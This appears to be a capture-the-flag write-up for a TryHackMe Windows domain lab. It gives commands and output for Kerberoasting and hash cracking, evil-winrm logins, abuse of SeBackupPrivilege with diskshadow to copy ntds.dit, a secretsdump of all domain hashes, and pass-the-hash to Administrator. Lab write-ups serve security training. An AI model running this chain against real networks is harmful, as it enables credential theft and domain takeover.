$krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/xyan1d3*$99ef1b60f5d5b5a45fda5db83d438551$2cd7fcd1dd241ac634f864e985946cc284e0d3b278a6a379a9c6a7e811114317b4c704e499afcb83e16361fd31508e0f825ffdf09e6640328d553b9150dd4cd15a6e5b3a78ce85cf104c30d5c81b1101ffa115ef26a057542ed4d223d2f8b3a4e1222db953403041596f079c7982af5f865b2e3e71f296cda39f43ac21dd96e5a615a77b60e91a046c8e5bb88508efcef7d56d63a3b506d10e371ab6e9e39c8db8b6ac3fdff0f9581db789c8778dd6018039f72c129b3922445f8e160bedeca8ba91943286c0c518be2e9798689c03e9c3e4ff0e335eb33772bbf0782986608719458e57df1faa47092482920bffd162bbfc93d52ff170488c7c28fe68d67d49858c73ab3e73a0f0bc6d23a35cbc660dc55203ae345464770eceb7c6967d7d5a6b865d7db066af287d9eb9d43d62c7a052db52a0ccc20526be2731af54e758426765cb01c405faa7efd8a9513887a6c7083dd810d4bd0fa97689d8b55819a417702aa8219d0bd9402c71963c21830eb27c2668a78865406e7b1b014c05cad90ca386ed1b69fc1167ae378a4f588ee6b6576e50db4cd935aa4585a81c3ba430cf48178ec850e23a4efd116476850e45bc8f7eaab5b5dd935ffa74d8ab6511657cbf49b696e4636d911021372ed2d754cb5dde5f1e8984cb9a26c3c556e39d64b684a83731023b4a23be25ba31cf441339c80c684d7d47e939a885782bb73a2a4539a94a6b4aa8aaa1b1da7884967b167a9a3e8426f372f4e6a77e9057b3e18ede42618eb0e461650e899c3b5d4fce527f6562fbe91d10a3d84eb3acbafdac403f2a3babae8ff63cae6b8b7fddeebe987b496621de1d76b669c000f172da73051fbd553e029c9d0b194f876b03147861e16e770cf3734c837650037d2a09a705352abb945635b94eac9f6aeffc964fb2e9eed54c1dd9cedcbc7521f0a93748c6efa1bb82a45d7233a1a27bc294f20a32c8592a06066ce677fd25fda72691600eb4db9f011002237697d0ea4a175cbb5b4aed01eee438a8ad36eb06f7825d91ccb2456495c697ade6d12dd29d51631d0a87869b0789fffad8e370244be664ae00002e41a289569401bb58cfa61e3ce3d1765757aded92cc74005158891de9b83230860349d12584f5fd101ed55bdc4ca3fb708dc1c635b6a8850a5b3b1de6d2fb9c21afe21ddcfeb90b3fa4c2117c985a0c8fbf8ea848bb18de8d35de7a1b9d536d2e600cdbe1fc37226e4f0f4d298b83b7efc2e64c179c5f579e4306b03866f155f0118f748abbc078ebfade43935d258f06427ca3fb42da29c9011ce1adeec4baafff8d8132004e3b460ad59506e5433ad76afdcbc5b5c10f75aa5a03dfa975e97e633f4b57a901d25593df3261cd8548760ef9a3f020524ee6ac21e7c2540d41424232c3d1f4ff9c6c3b1aaea39949:cyanide9amine5628
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/...a39949
Time.Started.....: Sat Aug  6 20:05:36 2022 (21 secs)
Time.Estimated...: Sat Aug  6 20:05:57 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   592.3 kH/s (0.69ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 8867840/14344385 (61.82%)
Rejected.........: 0/8867840 (0.00%)
Restore.Point....: 8866816/14344385 (61.81%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: cybernickisgay -> cy4ever
Hardware.Mon.#1..: Util: 38%

Started: Sat Aug  6 20:05:01 2022
Stopped: Sat Aug  6 20:06:00 2022
                                                                                           
┌──(kali㉿kali)-[~/Downloads/smb]
└─$ hashcat -m 13100 hashes.kerberoast --show                          
$krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/xyan1d3*$99ef1b60f5d5b5a45fda5db83d438551$2cd7fcd1dd241ac634f864e985946cc284e0d3b278a6a379a9c6a7e811114317b4c704e499afcb83e16361fd31508e0f825ffdf09e6640328d553b9150dd4cd15a6e5b3a78ce85cf104c30d5c81b1101ffa115ef26a057542ed4d223d2f8b3a4e1222db953403041596f079c7982af5f865b2e3e71f296cda39f43ac21dd96e5a615a77b60e91a046c8e5bb88508efcef7d56d63a3b506d10e371ab6e9e39c8db8b6ac3fdff0f9581db789c8778dd6018039f72c129b3922445f8e160bedeca8ba91943286c0c518be2e9798689c03e9c3e4ff0e335eb33772bbf0782986608719458e57df1faa47092482920bffd162bbfc93d52ff170488c7c28fe68d67d49858c73ab3e73a0f0bc6d23a35cbc660dc55203ae345464770eceb7c6967d7d5a6b865d7db066af287d9eb9d43d62c7a052db52a0ccc20526be2731af54e758426765cb01c405faa7efd8a9513887a6c7083dd810d4bd0fa97689d8b55819a417702aa8219d0bd9402c71963c21830eb27c2668a78865406e7b1b014c05cad90ca386ed1b69fc1167ae378a4f588ee6b6576e50db4cd935aa4585a81c3ba430cf48178ec850e23a4efd116476850e45bc8f7eaab5b5dd935ffa74d8ab6511657cbf49b696e4636d911021372ed2d754cb5dde5f1e8984cb9a26c3c556e39d64b684a83731023b4a23be25ba31cf441339c80c684d7d47e939a885782bb73a2a4539a94a6b4aa8aaa1b1da7884967b167a9a3e8426f372f4e6a77e9057b3e18ede42618eb0e461650e899c3b5d4fce527f6562fbe91d10a3d84eb3acbafdac403f2a3babae8ff63cae6b8b7fddeebe987b496621de1d76b669c000f172da73051fbd553e029c9d0b194f876b03147861e16e770cf3734c837650037d2a09a705352abb945635b94eac9f6aeffc964fb2e9eed54c1dd9cedcbc7521f0a93748c6efa1bb82a45d7233a1a27bc294f20a32c8592a06066ce677fd25fda72691600eb4db9f011002237697d0ea4a175cbb5b4aed01eee438a8ad36eb06f7825d91ccb2456495c697ade6d12dd29d51631d0a87869b0789fffad8e370244be664ae00002e41a289569401bb58cfa61e3ce3d1765757aded92cc74005158891de9b83230860349d12584f5fd101ed55bdc4ca3fb708dc1c635b6a8850a5b3b1de6d2fb9c21afe21ddcfeb90b3fa4c2117c985a0c8fbf8ea848bb18de8d35de7a1b9d536d2e600cdbe1fc37226e4f0f4d298b83b7efc2e64c179c5f579e4306b03866f155f0118f748abbc078ebfade43935d258f06427ca3fb42da29c9011ce1adeec4baafff8d8132004e3b460ad59506e5433ad76afdcbc5b5c10f75aa5a03dfa975e97e633f4b57a901d25593df3261cd8548760ef9a3f020524ee6ac21e7c2540d41424232c3d1f4ff9c6c3b1aaea39949:cyanide9amine5628

cyanide9amine5628


What is Xyan1d3's Flag?

┌──(kali㉿kali)-[~/Downloads/smb]
└─$ evil-winrm -i 10.10.146.199 -u xyan1d3 -H cyanide9amine5628        

Evil-WinRM shell v3.4

Error: Invalid hash format

                                                                                           
┌──(kali㉿kali)-[~/Downloads/smb]
└─$ evil-winrm -i 10.10.146.199 -u xyan1d3 -p cyanide9amine5628

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                               

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                 

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\xyan1d3\Documents> cd ..
*Evil-WinRM* PS C:\Users\xyan1d3> ls


    Directory: C:\Users\xyan1d3


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/15/2018  12:19 AM                Desktop
d-r---        2/25/2021   9:34 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos
-a----        2/25/2021   9:33 AM           1826 xyan1d3.xml


*Evil-WinRM* PS C:\Users\xyan1d3> $Credential = Import-Clixml -Path "xyan1d3.xml"
*Evil-WinRM* PS C:\Users\xyan1d3> $Credential.GetNetworkCredential().password
LOL here it is -> THM{62ca7e0b901aa8f0b233cade0839b5bb}

What is the root Flag?

check privileges:

*Evil-WinRM* PS C:\Users\xyan1d3> whoami /all[...]PRIVILEGES INFORMATION
----------------------Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

The interesting one here is

SeBackupPrivilege             Back up files and directories  Enabled

This specific privilege escalation is based on the act of assigning a user SeBackupPrivilege. It was designed for allowing users to create backup copies of the system. This privilege allows the user to read any file on the entirety of the files that might also include some sensitive files such as the SAM file or SYSTEM Registry file. From the attacker’s perspective, this can be exploited after gaining the initial foothold in the system and then moving up to an elevated shell by essentially reading the SAM files and possibly crack the passwords of the high privilege users on the system or network.

Before using this exploit we need to Dump the Domain Credentials to a file. For this, we will use DiskShadow (a Windows signed binary).

Prepare the diskshadow.txt

Abuse Backup Privs (important: diskshadow.txt has a space after each line):

cat diskshadow.txtset metadata C:\tmp\tmp.cabs 
set context persistent nowriters 
add volume c: alias someAlias 
create 
expose %someAlias% h:

Upload this file to the machine

*Evil-WinRM* PS C:\Users\xyan1d3> mkdir C:\tmp
*Evil-WinRM* PS C:\tmp> upload diskshadow.txt

Execute the diskshadow.exe from the created directory

*Evil-WinRM* PS C:\tmp> diskshadow.exe /s c:\tmp\diskshadow.txtMicrosoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  HAVEN-DC

-> set metadata C:\tmp\tmp.cabs
-> set context persistent nowriters
-> add volume c: alias someAlias
-> create
Alias someAlias for shadow ID {29b531e8-3c00-49f9-925d-5e1e3937af13} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {2c73aeea-cdb0-47d5-85f8-dfe4dfbdbea6} set as environment variable.

Querying all shadow copies with the shadow copy set ID {2c73aeea-cdb0-47d5-85f8-dfe4dfbdbea6}

        * Shadow copy ID = {29b531e8-3c00-49f9-925d-5e1e3937af13}               %someAlias%
                - Shadow copy set: {2c73aeea-cdb0-47d5-85f8-dfe4dfbdbea6}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{115c1f55-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 7/16/2021 3:45:20 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: HAVEN-DC.raz0rblack.thm
                - Service machine: HAVEN-DC.raz0rblack.thm
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %someAlias% h:
-> %someAlias% = {29b531e8-3c00-49f9-925d-5e1e3937af13}
The shadow copy was successfully exposed as h:\.

Now let's abuse the SeBackupPrivilege. For this, we need few dll files which we can download from here. After downloading we need to execute it in the following way and then download the hashes.

ref:

    https://coldfusionx.github.io/posts/Blackfield-HTB/
    http://www.lib4dev.in/info/buftas/Active-Directory-Exploitation-Cheat-Sheet/242721738

Get dll’s to abuse Backup Privs:

root@kali$ wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll

root@kali$ wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll

Upload, import, abuse:

*Evil-WinRM* PS C:\Users\xyan1d3> mkdir C:\tmp


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         8/6/2022   5:13 PM                tmp


*Evil-WinRM* PS C:\Users\xyan1d3> upload diskshadow.txt
Info: Uploading diskshadow.txt to C:\Users\xyan1d3\diskshadow.txt

                                                             
Data: 168 bytes of 168 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\xyan1d3> cd C:\tmp
*Evil-WinRM* PS C:\tmp> dir
*Evil-WinRM* PS C:\tmp> upload diskshadow.txt
Info: Uploading diskshadow.txt to C:\tmp\diskshadow.txt

                                                             
Data: 168 bytes of 168 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\tmp> diskshadow.exe /s c:\tmp\diskshadow.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  HAVEN-DC,  8/6/2022 5:15:48 PM

-> set metadata C:\tmp\tmp.cabs
-> set context persistent nowriters
-> add volume c: alias someAlias
-> create
Alias someAlias for shadow ID {065f21bb-4e37-40f2-93ff-8f5956052a39} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {750215bc-31a2-4b74-b734-b8ad1350694a} set as environment variable.

Querying all shadow copies with the shadow copy set ID {750215bc-31a2-4b74-b734-b8ad1350694a}

 * Shadow copy ID = {065f21bb-4e37-40f2-93ff-8f5956052a39}      %someAlias%
  - Shadow copy set: {750215bc-31a2-4b74-b734-b8ad1350694a}   %VSS_SHADOW_SET%
  - Original count of shadow copies = 1
  - Original volume name: \\?\Volume{115c1f55-0000-0000-0000-602200000000}\ [C:\]
  - Creation time: 8/6/2022 5:15:49 PM
  - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
  - Originating machine: HAVEN-DC.raz0rblack.thm
  - Service machine: HAVEN-DC.raz0rblack.thm
  - Not exposed
  - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
  - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %someAlias% h:
-> %someAlias% = {065f21bb-4e37-40f2-93ff-8f5956052a39}
The shadow copy was successfully exposed as h:\.
->
*Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeUtils.dll
Info: Uploading SeBackupPrivilegeUtils.dll to C:\tmp\SeBackupPrivilegeUtils.dll

                                                             
Data: 21844 bytes of 21844 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeCmdLets.dll
Info: Uploading SeBackupPrivilegeCmdLets.dll to C:\tmp\SeBackupPrivilegeCmdLets.dll

                                                             
Data: 16384 bytes of 16384 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\tmp> import-module .\SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\tmp> import-module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\tmp> copy-filesebackupprivilege h:\windows\ntds\ntds.dit C:\tmp\ntds.dit -overwrite
*Evil-WinRM* PS C:\tmp> reg save HKLM\SYSTEM C:\tmp\system
The operation completed successfully.

*Evil-WinRM* PS C:\tmp> download ntds.dit
Info: Downloading ntds.dit to ./ntds.dit

                                                             
Info: Download successful!

*Evil-WinRM* PS C:\tmp> download system
Info: Downloading system to ./system

                                                             
Info: Download successful!

*Evil-WinRM* PS C:\tmp> 

python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -system system -ntds ntds.dit LOCAL

Administrator:500:aad3b435b51404eeaad3b435b51404ee:9689931bed40ca5a2ce1218210177f0c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HAVEN-DC$:1000:aad3b435b51404eeaad3b435b51404ee:26cc019045071ea8ad315bd764c4f5c6:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fa3c456268854a917bd17184c85b4fd1:::
raz0rblack.thm\xyan1d3:1106:aad3b435b51404eeaad3b435b51404ee:bf11a3cbefb46f7194da2fa190834025:::
raz0rblack.thm\lvetrova:1107:aad3b435b51404eeaad3b435b51404ee:f220d3988deb3f516c73f40ee16c431d:::
raz0rblack.thm\sbradley:1108:aad3b435b51404eeaad3b435b51404ee:351c839c5e02d1ed0134a383b628426e:::
raz0rblack.thm\twilliams:1109:aad3b435b51404eeaad3b435b51404ee:351c839c5e02d1ed0134a383b628426e:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:ab77c0dd6f5a28b63c4ae5f0eb89ad48f3ed43d52dc42f1dca2e99d8fc9cdbbf
Administrator:aes128-cts-hmac-sha1-96:81a749369e929b7f1731489b12a49df8
Administrator:des-cbc-md5:d3b646b65bceb5c7
HAVEN-DC$:aes256-cts-hmac-sha1-96:d6b41169e02a4543b90a8c697b167948413397c30f1bf5f0199a54f387358fc6
HAVEN-DC$:aes128-cts-hmac-sha1-96:5ed5bd57484ca826e09afa6e5b944c27
HAVEN-DC$:des-cbc-md5:f71a0dc89b9d079d
krbtgt:aes256-cts-hmac-sha1-96:eed4acbdf1b6cc2b3c1aef992a8cea74d8b0c4ad5b4deecf47c57c4d9465caf5
krbtgt:aes128-cts-hmac-sha1-96:3dbbd202aa0343d1b8df99785d2befbb
krbtgt:des-cbc-md5:857a46f13e91eae3
raz0rblack.thm\xyan1d3:aes256-cts-hmac-sha1-96:6de380d21ae165f55e7520ee3c4a81417bf6a25b17f72ce119083846d89a031f
raz0rblack.thm\xyan1d3:aes128-cts-hmac-sha1-96:9f5a0114b2c18ea63a32a1b8553d4f61
raz0rblack.thm\xyan1d3:des-cbc-md5:e9a1a46223cd8975
raz0rblack.thm\lvetrova:aes256-cts-hmac-sha1-96:3809e38e24ecb746dc0d98e2b95f39fc157de38a9081b3973db5be4c25d5ad39
raz0rblack.thm\lvetrova:aes128-cts-hmac-sha1-96:3676941361afe1800b8ab5d5a15bd839
raz0rblack.thm\lvetrova:des-cbc-md5:385d6e1f1cc17fb6
raz0rblack.thm\sbradley:aes256-cts-hmac-sha1-96:ddd43169c2235d3d2134fdb2ff4182abdb029a20724e679189a755014e68bab5
raz0rblack.thm\sbradley:aes128-cts-hmac-sha1-96:7cdf6640a975c86298b9f48000047580
raz0rblack.thm\sbradley:des-cbc-md5:83fe3e584f4a5bf8
raz0rblack.thm\twilliams:aes256-cts-hmac-sha1-96:05bac51a4b8888a484e0fa1400d8f507b195c4367198024c6806d8eb401cb559
raz0rblack.thm\twilliams:aes128-cts-hmac-sha1-96:a37656829f443e3fe2630aa69af5cb5a
raz0rblack.thm\twilliams:des-cbc-md5:01e958b0ea6edf07

Finally, from here we get the administrator Hashes. We can use this to login into the system using Evil-WinRM

Get admin flag
┌──(kali㉿kali)-[~/Downloads/smb]
└─$ evil-winrm -i 10.10.46.179 -u administrator -H 9689931bed40ca5a2ce1218210177f0c

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                             

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                               

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> ls


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        5/21/2021   9:45 AM                3D Objects
d-r---        5/21/2021   9:45 AM                Contacts
d-r---        5/21/2021   9:45 AM                Desktop
d-r---        5/21/2021   9:45 AM                Documents
d-r---        5/21/2021   9:45 AM                Downloads
d-r---        5/21/2021   9:45 AM                Favorites
d-r---        5/21/2021   9:45 AM                Links
d-r---        5/21/2021   9:45 AM                Music
d-r---        5/21/2021   9:45 AM                Pictures
d-r---        5/21/2021   9:45 AM                Saved Games
d-r---        5/21/2021   9:45 AM                Searches
d-r---        5/21/2021   9:45 AM                Videos
-a----        2/25/2021   1:08 PM            290 cookie.json
-a----        2/25/2021   1:12 PM           2512 root.xml


*Evil-WinRM* PS C:\Users\Administrator> type root.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">Administrator</S>
      <SS N="Password">44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b31623466343663633466626134363334383237336431386463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e642070726976696c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2f6c696e75786167656e63792e0a</SS>
  </Obj>
</Objs>
*Evil-WinRM* PS C:\Users\Administrator> 

┌──(kali㉿kali)-[~/Downloads/smb]
└─$ python3                                                                                            
Python 3.10.5 (main, Jun  8 2022, 09:26:22) [GCC 11.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> s = "44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b31623466343663633466626134363334383237336431386463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e642070726976696c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2f6c696e75786167656e63792e0a"
>>> print(bytes.fromhex(s).decode('ASCII'))
Damn you are a genius.
But, I apologize for cheating you like this.

Here is your Root Flag
THM{1b4f46cc4fba46348273d18dc91da20d}

Tag me on https://twitter.com/Xyan1d3 about what part you enjoyed on this box and what part you struggled with.

If you enjoyed this box you may also take a look at the linuxagency room in tryhackme.
Which contains some linux fundamentals and privilege escalation https://tryhackme.com/room/linuxagency.

>>> 

What is Tyson's Flag?

As Administrator:

*Evil-WinRM* PS C:\Users\Administrator> cd ..
*Evil-WinRM* PS C:\Users> cd twilliams
*Evil-WinRM* PS C:\Users\twilliams> dir


    Directory: C:\Users\twilliams


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/15/2018  12:19 AM                Desktop
d-r---        2/25/2021  10:18 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos
-a----        2/25/2021  10:20 AM             80 definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_de
                                                 finitely_definitely_not_a_flag.exe


*Evil-WinRM* PS C:\Users\twilliams> type .\definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe
THM{5144f2c4107b7cab04916724e3749fb0}

What is the complete top secret?

Enumerate all folders and find top secret path:

*Evil-WinRM* PS C:\Users\twilliams> cd "C:\Program Files\Top Secret"
*Evil-WinRM* PS C:\Program Files\Top Secret> dir


    Directory: C:\Program Files\Top Secret


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/25/2021  10:13 AM         449195 top_secret.png


*Evil-WinRM* PS C:\Program Files\Top Secret> download top_secret.png
Info: Downloading top_secret.png to ./top_secret.png

                                                             
Info: Download successful!

```

[[Polkit_CVE]]